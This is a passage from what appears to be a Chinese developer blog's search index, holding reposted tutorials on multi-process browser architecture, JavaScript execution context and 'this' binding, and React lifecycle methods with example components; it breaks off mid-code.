库，有关HTML解析、DOM生成和操作和JScript脚本的 MSHTML.dll库，有关网络和缓存的 Winlnet.dll 以及再上面包裹了一层的更安全的提供下载资源的 URLMon.dll 库等。可能你会想 Tab进程就是说一个Tab页一个进程么？实际上不是的，考虑到创建一个进程的开销比较大，在windows上创建一个新的Tab进程也需要载入这么一堆的动态链接库。IE8的Tab进程数目是有一定的限制策略的，当Tab进程达到最大限度的时候，新打开的网页会复用之前创建的Tab进程来处理。（另：这个策略存在于windows注册表中的 TabProcGrowth 键值，你可以Google一下这个配置信息看看改变它会如何改变Tab进程的使用策略） Firefox的多进程架构早期的firefox也是单进程的，当他们也发现把所有Tab页的HTML渲染和JavaScript执行，以及浏览器窗口的UI都放到一个进程里是一个非常糟糕的设计的时候，也开始在进程架构上做出了调整。然后Mozilla启动了一个叫做 Electrolysis （也叫做 e10s ）的计划准备逐步将进程架构往多进程上去迁移，这个时间节点是在2016年。于是经历了Firefox一共9个版本的迭代，从Firefox 48 到 56，逐步的完善了多进程架构。 对于浏览器主进程、GPU进程、扩展程序进程来说，相信各位已经很了解了。也就不多废话了。 主要来看Tab进程，Tab进程和Chrome的渲染进程类似，也是用来渲染页面，执行Javascript代码的。不过对于Firefox的Tab进程来说，可以看出Firefox的Tab进程和IE的Tab进程有个相似点就是：有多个Tab进程，但都不一定是一个页面一个Tab进程，一个Tab进程可能会负责多个页面的渲染。作为对比，Chrome是以一个页面一个渲染进程，加上站点隔离的策略来进行的。所以我们可想而知，一般情况下，Chrome所需要的内存消耗应该也会更多，毕竟不像Firefox和IE一样对页面渲染所用的进程做最大值的限制，站点隔离的策略也只是优化了那么一些。我在下面附上一张内存消耗对比图，各位可以自行看一下。 总结对于早期的单进程浏览器来说，页面渲染、JS执行、插件运行、还有浏览器主程序的运行都放在单个的一个进程里，对于浏览器来说，无法应用更好的安全特性，而且很容易一崩全崩，即使是正常运行也会出现一些不流畅的问题。于是各个浏览器厂商最终都在向多进程浏览器做转变，Chrome浏览器在最开始发布的时候就是采用了多进程的架构，IE是从IE8开始做的调整，而Firefox则是开启 Electrolysis 计划，在2016年前后逐步将Firefox迁移到了多进程的架构模式。 在迁移的过程中，各个浏览器有个相同点是各个浏览器都将浏览器的主进程，也就是用来运行浏览器窗口的进程单独抽离成一个来运行，以此为基础创建各个去进行页面渲染的渲染进程等子进程，并统一管理。IE8的多进程架构比较简单，且强依赖于windows系统的各种动态链接库；Chrome呢比较大方的给到每个页面一个渲染进程，同时也用站点隔离的策略做好了优化，对插件进程也是比较大方的给每个插件都有单独的进程，这样执行的各个程序从进程层面隔离开来，相互影响降到很小的程度，唯一的问题就是进程分配太大方，内存占用也上去了；Firefox在多进程架构的设计上，给了一个专门运行插件进程，用来渲染页面的Tab进程和IE8的Tab进程有个相同点在于都是对Tab进程有个最大值的限制的。 另外Chrome最新的进程架构也在往SOA，也就是面向服务的架构的方向转型。实现的方式就是将网络、设备、UI、媒体一类的程序抽象为服务，统一放入基础服务层中，供浏览器主进程、插件进程和渲染进程调用。利于节省资源以及拥有更良好可扩展性，降低现有多进程架构中耦合性太高的问题。这块儿可以各位自行了解，文末给出的参考资料中也有涉及。 相信各位对于浏览器的进程架构至少也略知一二了，希望对你的日常开发或对浏览器的使用上有一定的帮助。 参考资料 Internet Explorer Wikipedia: en.wikipedia.org/wiki/Intern… Internet Exploere Architecture: docs.microsoft.com/en-us/previ… Modern Multi-Process Browser Architecture: helgeklein.com/blog/2019/0… Inside look at mordern web browser (part 1): developers.google.com/web/updates… Multi-process Architecture: dev.chromium.org/developers/… Multiprocess Firefox: developer.mozilla.org/en-US/docs/… Multi-Process Firefox: everything you need to know: (www.ghacks.net/2016/07/22/…)[www.ghacks.net/2016/07/22/…] 极客时间《浏览器工作原理与实战》– Chrome架构: 仅仅打开了1个页面，为什么有4个进程？ Servicification: www.chromium.org/servicifica… Meltdown/Spectre: developers.google.com/web/updates… 相关文章 从浏览器多进程到JS单线程，JS运行机制最全面的一次梳理]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解JS执行上下文的点点滴滴]]></title>
    <url>%2F2020%2F02%2F04%2FWeb%E5%89%8D%E7%AB%AF%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3JS%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87%E7%9A%84%E7%82%B9%E7%82%B9%E6%BB%B4%E6%BB%B4%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5ce767eef265da1bbf68f724 前言对于一名前端开发者来说，深入理解JavaScript程序内部执行机制当然是很有必要的，其中一个关键概念就是JavaScript的执行上下文和执行栈，理解这部分内容也有助于理解作用域、闭包等 本次重点 执行上下文概念、类型、特点 执行上下文的生命周期 关于变量提升 this指向问题 执行上下文栈 基本概念：所谓的JavaScript执行上下文就是当前JS代码代码被解析和执行时所在环境的抽象概念，js代码都是在执行上下文中运行的 一、执行上下文类型1.全局执行上下文它的特点有以下几个： a.它是最基础、默认的全局执行上下文 b.它会创建一个全局对象，并且将this指向全局对象，在浏览器中全局对象是window，在nodejs中全局对象是global c.一个程序中只有一个 2.函数执行上下文它的特点有以下几个： a.有自己的执行上下文 b.可以在一个程序中存在任意数量 c.是函数被执行时创建 3.eval函数执行上下文：eval函数可以计算某个字符串，并执行其中的js代码，这样就会存在一个安全性问题，在代码字符串未知或者是来自于用户输入源的话，绝对不要使用eval函数 以上就是执行上下文的几种类型和相应的特点，我们可以看下下面这段代码： 里面的三个函数都被执行了，所以是有三个函数执行上下文 12345678910111213// 全局执行上下文var sayHello = &apos;Hello&apos;function someone() &#123; // 函数执行上下文 var first = &apos;Tom&apos;, last = &apos;Ada&apos; function getFirstName() &#123; // 函数执行上下文 return first &#125; function getLastName() &#123; // 函数执行上下文 return last &#125; console.log(sayHello + getFirstName() + getLastName())&#125;someone() 二、执行上下文的生命周期执行上下文的生命周期分了三个阶段： 创建阶段 执行阶段 回收阶段 创建阶段对于函数执行上下文，函数被调用的时候，但是还未执行里面的代码之前，会做三件事情: 创建变量对象：会初始化函数的参数，提升函数声明和变量声明 创建作用域链：作用域链用于标识符解析，看下面代码： f3函数被调用的时候，里面的变量num要求被解析的时候，会在当前f3的作用域里查找，如果没找到，就会向上一层作用域中查找，直到在全局作用找到该变量为30 1234567891011var num = 30;function f1() &#123; function f2() &#123; function f3() &#123; console.log(num); &#125; f3(); &#125; f2();&#125;f1(); 确定this指向：这个情况比较多，会在下文统一介绍 在一个程序执行之前，要先解析代码，会先创建全局执行上下文环境，把需要执行的变量和函数声明都取出来并暂时赋值为undefined，函数也要先声明好待调用，这也是我们下文中会讲到的变量提升，以上几步做完后，开始正式执行程序 执行阶段执行的变量赋值、函数调用等代码执行 回收阶段执行上下文出栈，等待虚机垃圾回收执行上下文 三、变量提升变量提升分为两种： 变量声明提升 函数声明提升 关于变量声明提升，先看以下代码片段： 1234567console.log(a) // undefinedvar a = 5function test() &#123; console.log(a) // undefined var a = 10&#125;test() 以上代码中，第1个 a 是在全局执行上下文环境中，由于在全局执行上下文创建的时候，把需要执行的变量和函数声明都取出来并暂时赋值为undefined，所以打印出来的就是undefined 第2个 a 是在test这个函数执行上下文环境中，同上，所以打印出来的就是undefined 123456789var aconsole.log(a) // undefineda = 5function test() &#123; var a console.log(a) // undefined a = 10&#125;test() 关于函数声明提升，看以下代码: 1234console.log(f1) // function f1() &#123;&#125;function f1() &#123;&#125;console.log(f2) // undefinedvar f2 = function() &#123;&#125; 打印结果在注释中，由于变量声明和函数声明提升原则可以把代码改成如下： 12345function f1() &#123;&#125;console.log(f1) // function f1() &#123;&#125;var f2;console.log(f2) // undefinedf2 = function() &#123;&#125; f1和f2不一样的地方是：f1是普通函数声明的方式，f2是函数表达式，在f2未被赋值的时候，它就是一个变量，这个时候变量提升，所以打印的f2为undefined 如果一个变量既是函数声明的方式，又是变量声明的方式，代码如下: 我们发现函数声明的优先级是高于变量提升的优先级的 123456789function test(arg)&#123; console.log(arg); // function arg()&#123;console.log(&apos;hello world&apos;) &#125; var arg = &apos;hello&apos;; function arg()&#123; console.log(&apos;hello world&apos;) &#125; console.log(arg); // hello &#125;test(&apos;hi&apos;); 总结：变量提升的几个特点： 如果有形参，先给形参赋值 函数声明的优先级是高于变量提升的优先级的，但可以重新赋值 私有作用域代码从上到下执行 四、确定this指向问题this指向问题通常会在一些面试题中出现，情况比较多，先了解下它的一些特点： this是执行上下文的一部分 需要在执行时确定 浏览器中 this 指向 window， node中this指向global 对于非严格模式和es5的js程序中，this指向可以分为以下几种情况：第一种：a()直接调用的方式，this === window 12345function a() &#123; console.log(this.b) &#125;var b = 0a() 打印出的值为 0 第二种：谁调用了函数，谁就是this 12345function a() &#123; console.log(this)&#125;var obj = &#123;a: a&#125;obj.a() 打印出的值为obj这个对象 第三种：构造函数模式下，this指向当前执行类的实例 123456function getPersonInfo(name, age) &#123; this.name = name this.age = age console.log(this)&#125;var p1 = new getPersonInfo(&apos;linda&apos;, 13) 打印出来的值是： getPersonInfo{ name: ‘linda’, age: 13 } 第四种：call/apply/bind调用函数的方式，this指向第一个参数 1234567function add (b, c) &#123; console.log(this) return this.a + b + c&#125;var obj = &#123;a: 3&#125;add.call(obj, 5, 7)add.call(obj, [10, 20]) 打印出来的值就是obj的值 对于严格模式的js程序中，this指向对于直接调用的方式有所不同：严格模式下，函数直接调用的方式中this指向undefined 12345&apos;use strict&apos;function a() &#123; console.log(this) &#125;a() 这个时候函数里的this打印出 undefined 对于箭头函数箭头函数没有自身的this关键字，看外层是否有函数，如果有函数，外层函数的this就是内部箭头函数的this，如果没有，this就是指向window 可以看以下几种情况： 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: function() &#123; var show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() 打印结果：Person name is undefined, age is undefined 里面的函数show被调用的时候，是普通函数调用的情况，所以this指向window，而全局函数中没有myName和age，所以打印出来是undefined 可以换成箭头函数： 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: function() &#123; var show = () =&gt; &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() 打印出的结果是：Person name is linda, age is 1 对于箭头函数自身没有this关键字，所以看外层函数，而外层函数中是我们前面说到的第二种情况，this指向person这个对象，所以是有myName和age的值 如果把clickPerson也换成箭头函数： 1234567891011var person = &#123; myName: &apos;linda&apos;, age:1, clickPerson: () =&gt; &#123; var show = () =&gt; &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125; show() &#125;&#125;person.clickPerson() 我们发现打印的结果是：Person name is undefined, age is undefined 由于都是箭头函数，最后找到了全局的window，所以this指向window，而全局函数中没有myName和age，所以打印出来是undefined 再看另外一个例子： 1234567891011121314151617function getPersonInfo(name,age)&#123; this.myName = name; this.age = age; this.show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125;&#125;getPersonInfo.prototype.friend = function(friends) &#123; var array = friends.map(function(friend) &#123; return `my friend $&#123;this.myName&#125; age is $&#123;this.age&#125;` &#125;); console.log(array);&#125;var person1 = new getPersonInfo(&quot;linda&quot;,18);person1.show()person1.friend([&apos;Ada&apos;, &apos;Tom&apos;]) show()函数调用结果打印：Person name is linda, age is 18 friend()函数调用打印结果：[&quot;my friend undefined age is undefined&quot;, &quot;my friend undefined age is undefined&quot;] 对于friend函数内部，this指向的是当前的getPersonInfo这个构造函数初始化的实例，但是在内部使用map是一个闭包函数，且内部是普通函数的调用方式，所以内部this是指向了window，可以把里面普通函数调用的方式改成箭头函数的方式即可 1234567891011121314151617function getPersonInfo(name,age)&#123; this.myName = name; this.age = age; this.show = function() &#123; console.log(`Person name is $&#123;this.myName&#125;, age is $&#123;this.age&#125;`) &#125;&#125;getPersonInfo.prototype.friend = function(friends) &#123; var array = friends.map((friend) =&gt; &#123; return `my friend $&#123;this.myName&#125; age is $&#123;this.age&#125;` &#125;); console.log(array);&#125;var person1 = new getPersonInfo(&quot;linda&quot;,18);person1.show()person1.friend([&apos;Ada&apos;, &apos;Tom&apos;]) 这次打印结果就是[&quot;my friend linda age is 18&quot;, &quot;my friend linda age is 18&quot;]就是我们预想的了 总结：（非严格模式下）可以按照下图规律查找this的指向 五、执行上下文栈js创建了执行上下文栈来管理执行上下文，我们通过如下一段代码和进栈出栈顺序图来理解执行上下文栈 12345678910var name = &apos;Tom&apos;;function father() &#123; var sonName = &apos;Anda&apos;; function son() &#123; console.log(&apos;son name is &apos;, sonName) &#125; console.log(&apos;father name is &apos;, name) son();&#125;father(); 过程： 1.全局执行上下文进栈 2.调用函数father，father函数执行上下文进栈 3.father函数内部代码执行，son函数被执行，son函数执行上下文进栈 4.son函数执行完毕，son函数的执行上下文出栈 5.father函数执行完毕，father函数的执行上下文出栈 6.浏览器关闭时，全局执行上下文出栈 执行上下文栈特点： 先创建全局执行上下文，并压入栈顶 函数执行时创建函数执行上下文，再压入栈顶 函数执行完函数的执行上下文出栈，等待垃圾回收 JS执行引擎总是访问栈顶的执行上下文 js代码是单线程的，代码是排队执行 全局执行上下文在浏览器关闭时出栈]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[你真的了解 React 生命周期吗]]></title>
    <url>%2F2020%2F02%2F03%2FWeb%E5%89%8D%E7%AB%AF%2F%E4%BD%A0%E7%9C%9F%E7%9A%84%E4%BA%86%E8%A7%A3%20React%20%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%90%97%2F</url>
    <content type="text"><![CDATA[转载自掘金网络，原文链接：https://juejin.im/post/5df648836fb9a016526eba01?utm_source=gold_browser_extension 旧版生命周期 初始化的时候不会把赋值算作更新，所以不会执行更新阶段 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788import React, &#123; Component &#125; from &apos;react&apos;export default class LifeCycle extends Component &#123; //// props = &#123;age:10,name:&apos;计数器&apos;&#125; static defaultProps = &#123; name:&apos;计数器&apos; &#125; constructor(props)&#123; //Must call super constructor in derived class before accessing &apos;this&apos; or returning from derived constructor super();//this.props = props; this.state = &#123;number:0,users:[]&#125;;//初始化默认的状态对象 console.log(&apos;1. constructor 初始化 props and state&apos;); &#125; //componentWillMount在渲染过程中可能会执行多次 componentWillMount()&#123; console.log(&apos;2. componentWillMount 组件将要挂载&apos;); //localStorage.get(&apos;userss&apos;); &#125; //componentDidMount在渲染过程中永远只有执行一次 //一般是在componentDidMount执行副作用，进行异步操作 componentDidMount()&#123; console.log(&apos;4. componentDidMount 组件挂载完成&apos;); fetch(&apos;https://api.github.com/users&apos;).then(res=&gt;res.json()).then(users=&gt;&#123; console.log(users); this.setState(&#123;users&#125;); &#125;); &#125; shouldComponentUpdate(nextProps,nextState)&#123; console.log(&apos;Counter&apos;,nextProps,nextState); console.log(&apos;5. shouldComponentUpdate 询问组件是否需要更新&apos;); return true; &#125; componentWillUpdate(nextProps, nextState)&#123; console.log(&apos;6. componentWillUpdate 组件将要更新&apos;); &#125; componentDidUpdate(prevProps, prevState))&#123; console.log(&apos;7. componentDidUpdate 组件更新完毕&apos;); &#125; add = ()=&gt;&#123; this.setState(&#123;number:this.state.number&#125;); &#125;; render() &#123; console.log(&apos;3.render渲染，也就是挂载&apos;) return ( &lt;div style=&#123;&#123;border:&apos;5px solid red&apos;,padding:&apos;5px&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.props.name&#125;:&#123;this.state.number&#125;&lt;/p&gt; &lt;button onClick=&#123;this.add&#125;&gt;+&lt;/button&gt; &lt;ul&gt; &#123; this.state.users.map(user=&gt;(&lt;li&gt;&#123;user.login&#125;&lt;/li&gt;)) &#125; &lt;/ul&gt; &#123;this.state.number%2==0&amp;&amp;&lt;SubCounter number=&#123;this.state.number&#125;/&gt;&#125; &lt;/div&gt; ) &#125;&#125;class SubCounter extends Component&#123; constructor(props)&#123; super(props); this.state = &#123;number:0&#125;; &#125; componentWillUnmount()&#123; console.log(&apos;SubCounter componentWillUnmount&apos;); &#125; //调用此方法的时候会把新的属性对象和新的状态对象传过来 shouldComponentUpdate(nextProps,nextState)&#123; console.log(&apos;SubCounter&apos;,nextProps,nextState); if(nextProps.number%3==0)&#123; return true; &#125;else&#123; return false; &#125; &#125; //componentWillReceiveProp 组件收到新的属性对象 componentWillReceiveProps()&#123; console.log(&apos;SubCounter 1.componentWillReceiveProps&apos;) &#125; render()&#123; console.log(&apos;SubCounter 2.render&apos;) return( &lt;div style=&#123;&#123;border:&apos;5px solid green&apos;&#125;&#125;&gt; &lt;p&gt;&#123;this.props.number&#125;&lt;/p&gt; &lt;/div&gt; ) &#125;&#125; 洋葱模型 新版生命周期 static getDerivedStateFromProps static getDerivedStateFromProps(nextProps,prevState)：接收父组件传递过来的 props 和组件之前的状态，返回一个对象来更新 state 或者返回 null 来表示接收到的 props 没有变化，不需要更新 state 该生命周期钩子的作用： 将父组件传递过来的 props 映射 到子组件的 state 上面，这样组件内部就不用再通过 this.props.xxx 获取属性值了，统一通过 this.state.xxx 获取。映射就相当于拷贝了一份父组件传过来的 props ，作为子组件自己的状态。注意：子组件通过 setState 更新自身状态时，不会改变父组件的 props 配合 componentDidUpdate，可以覆盖 componentWillReceiveProps 的所有用法 该生命周期钩子触发的时机： 在 React 16.3.0 版本中：在组件实例化、接收到新的 props 时会被调用 在 React 16.4.0 版本中：在组件实例化、接收到新的 props 、组件状态更新时会被调用 在线 demo —— 测试 16.3.0 和 16.4.0 版本中，该生命周期钩子什么情况下会被触发 使用： 在线 demo 注意：派生状态时，不需要把组件自身的状态也设置进去 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 666 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 888 &#125;; // 根据新的属性对象派生状态对象 // nextProps——新的属性对象 prevState——旧的状态对象 static getDerivedStateFromProps(nextprops, state) &#123; console.log(&apos;props&apos;,nextprops); // 返回一个对象来更新 state 或者返回 null 来表示接收到的 props 不需要更新 state if (nextprops.age !== state.age) &#123; console.log(&quot;更新吧&quot;); return &#123; onChangeParent:nextprops.onChangeParent, age: nextprops.age, // 注意：这里不需要把组件自身的状态也放进来 // num:state.num &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; render() &#123; const &#123; onChangeParent &#125; = this.state; console.log(&apos;state&apos;,this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); getSnapshotBeforeUpdate getSnapshotBeforeUpdate(prevProps, prevState)：接收父组件传递过来的 props 和组件之前的状态，此生命周期钩子必须有返回值，返回值将作为第三个参数传递给 componentDidUpdate。必须和 componentDidUpdate 一起使用，否则会报错 该生命周期钩子触发的时机 ：被调用于 render 之后、更新 DOM 和 refs 之前 该生命周期钩子的作用： 它能让你在组件更新 DOM 和 refs 之前，从 DOM 中捕获一些信息（例如滚动位置） 配合 componentDidUpdate, 可以覆盖 componentWillUpdate 的所有用法 在线 demo：每次组件更新时，都去获取之前的滚动位置，让组件保持在之前的滚动位置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import React, &#123; Component &#125; from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;GetSnapshotBeforeUpdate /&gt; &lt;/div&gt; );&#125;class GetSnapshotBeforeUpdate extends Component &#123; constructor(props) &#123; super(props); this.wrapper = React.createRef(); this.state = &#123; messages: [] &#125;; &#125; componentDidMount() &#123; setInterval(() =&gt; &#123; this.setState(&#123; messages: [&quot;msg:&quot; + this.state.messages.length, ...this.state.messages] &#125;); //this.setState(&#123;messages:[...this.state.messages,this.state.messages.length]&#125;); &#125;, 1000); &#125; getSnapshotBeforeUpdate() &#123; // 返回更新内容的高度 300px return this.wrapper.current.scrollHeight; &#125; componentDidUpdate(prevProps, prevState, prevScrollHeight) &#123; this.wrapper.current.scrollTop = this.wrapper.current.scrollTop + (this.wrapper.current.scrollHeight - prevScrollHeight); &#125; render() &#123; let style = &#123; height: &quot;100px&quot;, width: &quot;200px&quot;, border: &quot;1px solid red&quot;, overflow: &quot;auto&quot; &#125;; return ( &lt;ul style=&#123;style&#125; ref=&#123;this.wrapper&#125;&gt; &#123;this.state.messages.map((message, index) =&gt; ( &lt;li key=&#123;index&#125;&gt;&#123;message&#125;&lt;/li&gt; ))&#125; &lt;/ul&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); 版本迁移 componentWillMount，componentWillReceiveProps，componentWillUpdate 这三个生命周期因为经常会被误解和滥用，所以被称为 不安全（不是指安全性，而是表示使用这些生命周期的代码，有可能在未来的 React 版本中存在缺陷，可能会影响未来的异步渲染） 的生命周期。 React 16.3 版本：为不安全的生命周期引入别名 UNSAFE_componentWillMount，UNSAFE_componentWillReceiveProps 和 UNSAFE_componentWillUpdate。（旧的生命周期名称和新的别名都可以在此版本中使用） React 16.3 之后的版本：为 componentWillMount，componentWillReceiveProps 和 componentWillUpdate 启用弃用警告。（旧的生命周期名称和新的别名都可以在此版本中使用，但旧名称会记录DEV模式警告） React 17.0 版本： 推出新的渲染方式——异步渲染（ Async Rendering），提出一种可被打断的生命周期，而可以被打断的阶段正是实际 dom 挂载之前的虚拟 dom 构建阶段，也就是要被去掉的三个生命周期 componentWillMount，componentWillReceiveProps 和 componentWillUpdate。（从这个版本开始，只有新的“UNSAFE_”生命周期名称将起作用） 常见问题当外部的 props 改变时，如何再次执行请求数据、更改状态等操作使用 componentWillReceiveProps12345678910111213141516171819202122232425262728293031323334353637383940class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; componentWillReceiveProps(nextProps) &#123; // 当父组件的 props 改变时，重新请求数据 if (nextProps.id !== this.props.id) &#123; this.setState(&#123;externalData: null&#125;); this._loadAsyncData(nextProps.id); &#125; &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; 使用 getDerivedStateFromProps + componentDidUpdate 加载数据12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; return &#123; externalData: null, prevId: nextProps.id, &#125;; &#125; return null; &#125; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; // 借助 componentDidUpdate componentDidUpdate(prevProps, prevState) &#123; if (this.state.externalData === null) &#123; this._loadAsyncData(this.props.id); &#125; &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; 使用 getDerivedStateFromProps 更改状态 在线 demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88 &#125;; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.age !== prevState.age) &#123; return &#123; age: nextProps.age &#125;; &#125; return null; &#125; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; render() &#123; const &#123; onChangeParent &#125; = this.props; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); 只用 componentDidUpdate 的写法 不一定要使用 getDerivedStateFromProps 或者 componentWillReceiveProps 在线 demo 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import React from &quot;react&quot;;import ReactDOM from &quot;react-dom&quot;;import &quot;./styles.css&quot;;function App() &#123; return ( &lt;div className=&quot;App&quot;&gt; &lt;AAA /&gt; &lt;/div&gt; );&#125;class AAA extends React.Component &#123; state = &#123; age: 66 &#125;; add = () =&gt; &#123; this.setState(&#123; age: this.state.age + 1 &#125;); &#125;; render() &#123; return ( &lt;div&gt; &lt;ChildA onChangeParent=&#123;this.add&#125; age=&#123;this.state.age&#125; /&gt; &lt;/div&gt; ); &#125;&#125;class ChildA extends React.Component &#123; state = &#123; num: 88, age: this.props.age &#125;; add = () =&gt; &#123; this.setState(&#123; num: this.state.num + 1 &#125;); &#125;; componentDidUpdate() &#123; if (this.props.age !== this.state.age) &#123; console.log(&quot;componentDidUpdate&quot;, this.props.age); this.setState(&#123; age: this.props.age &#125;); &#125; &#125; render() &#123; const &#123; onChangeParent &#125; = this.props; console.log(&quot;render&quot;, this.state); return ( &lt;&gt; &lt;div onClick=&#123;onChangeParent&#125;&gt;change&lt;/div&gt; &lt;div onClick=&#123;this.add&#125;&gt;add&lt;/div&gt; &lt;/&gt; ); &#125;&#125;const rootElement = document.getElementById(&quot;root&quot;);ReactDOM.render(&lt;App /&gt;, rootElement); 使用 key 的写法 通过改变 key ，来重新初始化组件 在线 demo 这听起来很慢，但是这点的性能是可以忽略的。如果在组件树的更新上有很重的逻辑，这样反而会更快，因为省略了子组件的 diff React 官方建议的模式 我觉得这种写法，非常适合：当你调用同事写的业务 UI 组件时，如果他没有考虑到组件内部状态需要跟随外部 props 的更改的情况（恨不得上去就给他个膝盖重锤 😂😂😂），可以使用 key 来快速实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class ExampleComponent extends React.Component &#123; state = &#123; id: &apos;123456&apos;, &#125;; render()&#123; const &#123;id&#125; = this.state; // 当 id 变化时，key 也随之改变，那么组件就会重新初始化 return &lt;ExampleComponent key=&#123;id&#125; id=&#123;id&#125;/&gt;; &#125;&#125;class ExampleComponent extends React.Component &#123; state = &#123; externalData: null, &#125;; // 不需要使用 getDerivedStateFromProps 或者 componentWillReceiveProps // static getDerivedStateFromProps(nextProps, prevState) &#123; // if (nextProps.id !== prevState.prevId) &#123; // return &#123; // externalData: null, // prevId: nextProps.id, // &#125;; // &#125; // return null; // &#125; componentDidMount() &#123; this._loadAsyncData(this.props.id); &#125; componentWillUnmount() &#123; if (this._asyncRequest) &#123; this._asyncRequest.cancel(); &#125; &#125; render() &#123; if (this.state.externalData === null) &#123; // Render loading state ... &#125; else &#123; // Render real UI ... &#125; &#125; _loadAsyncData(id) &#123; this._asyncRequest = asyncLoadData(id).then( externalData =&gt; &#123; this._asyncRequest = null; this.setState(&#123;externalData&#125;); &#125; ); &#125;&#125; getDerivedStateFromProps 是一个静态方法，而组件实例无法继承静态方法，所以该生命周期钩子内部无法通过使用 this 获取组件实例的属性/方法。 有些情况下，我们需要对父组件传递过来的数据进行过滤/筛选等操作，而这些操作一般都会放在一个单独的函数中（单一原则），然后将该生命周期钩子获取到的props传递进这些方法中进行处理。 如果选择把这些方法放在 class 组件上，那么这些方法得申明成静态方法，然后在该生命周期钩子中通过 className.xxx 调用这些方法。 1234567891011121314151617181920212223class AAA extends React.Component &#123; static getDerivedStateFromProps(nextProps, prevState) &#123; if (nextProps.id !== prevState.prevId) &#123; const data = AAA.filterFn(nextProps.data); return &#123; data, prevId: nextProps.id, &#125;; &#125; return null; &#125; static filterFn(data)&#123; // 过滤数据 ... return newData; &#125; ...&#125; 或者把这些方法放在 class 组件外面，就不用申明成静态方法，在该生命周期钩子中直接调用这些方法。 12345678910111213141516171819202122function filterFn(data)&#123; // 过滤数据 ... return newData;&#125;class AAA extends React.Component &#123; static getDerivedStateFromProps(nextProps, prevState) &#123; if 